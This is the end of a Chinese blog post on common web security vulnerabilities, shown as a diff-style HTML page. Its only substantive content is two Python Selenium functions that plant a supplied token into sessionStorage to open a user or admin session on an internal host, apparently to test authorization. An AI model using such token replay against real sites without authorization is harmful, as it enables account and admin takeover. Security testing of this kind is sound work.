+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 重新放置新的Token</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">put_token_normal</span>(<span class="hljs-params">token</span>):<br>    <span class="hljs-keyword">global</span> wd<br>    <span class="hljs-comment"># wd.get(&quot;http://10.249.238.10&quot;)</span><br>    wd.execute_script(<span class="hljs-string">&quot;sessionStorage.setItem(&#x27;client_name&#x27;, &#x27;lty&#x27;)&quot;</span>)<br>    wd.execute_script(<span class="hljs-string">&quot;sessionStorage.setItem(&#x27;client_token&#x27;, arguments[0])&quot;</span>, token)<br>    wd.refresh()<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 放置Token到Admin页面</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">put_token_admin</span>(<span class="hljs-params">token</span>):<br>    <span class="hljs-keyword">global</span> wd_admin<br>    wd_admin.get(<span class="hljs-string">&quot;http://10.249.238.10/adminlogin.html&quot;</span>)<br>    wd_admin.execute_script(<span class="hljs-string">&quot;sessionStorage.setItem(&#x27;admin_name&#x27;, &#x27;lty&#x27;)&quot;</span>)<br>    wd_admin.execute_script(<span class="hljs-string">&quot;sessionStorage.setItem(&#x27;admin_token&#x27;, arguments[0])&quot;</span>, token)<br>    wd_admin.get(<span class="hljs-string">&quot;http://10.249.238.10/admin.html&quot;</span>)<br>    <span class="hljs-comment"># wd_admin.refresh()</span><br></code></pre></td></tr></table></figure></li>
+</ol>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Web%E5%AE%89%E5%85%A8/" class="category-chain-item">Web安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Token/">#Token</a>
+      
+        <a href="/tags/Web%E5%AE%89%E5%85%A8/">#Web安全</a>
+      
+        <a href="/tags/Selenium/">#Selenium</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Web安全漏洞</div>
+      <div>https://ltyzzzxxx.github.io/2023/02/06/Web常见安全漏洞/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>ltyzzz</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年2月6日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/01/30/Vue3-Nuxt3-%E9%A1%B9%E7%9B%AE%E7%AC%94%E8%AE%B0/" title="Vue3 + Nuxt3 项目笔记">
+                        <span class="hidden-mobile">Vue3 + Nuxt3 项目笔记</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"PAsgiGlK7bh6KGRouj9kLXmO-gzGzoHsz","appKey":"z6HB6YSs6EDZYIr2fHLvYQbu","path":"window.location.pathname","placeholder":"请留下你的足迹～ Please put forward your valuable comments :)","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":true},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
